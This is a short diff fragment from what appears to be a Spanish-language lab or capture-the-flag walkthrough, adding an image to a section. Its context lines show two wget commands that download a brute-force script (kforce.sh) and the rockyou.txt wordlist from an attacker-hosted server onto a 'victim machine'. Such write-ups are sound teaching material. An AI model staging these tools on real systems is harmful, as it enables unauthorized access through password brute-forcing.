@@ -92,5 +92,6 @@ y en la máquina victima descargaremos los archivos necesarios en ```/tmp/``` (y
 wget http://172.17.0.1:8000/kforce.sh
 wget http://172.17.0.1:8000/rockyou.txt
 ```
+<img width="669" height="533" alt="image" src="https://github.com/user-attachments/assets/54b8dfbc-a0c3-40a8-a6eb-4ecdcbabf03b" />
 
 
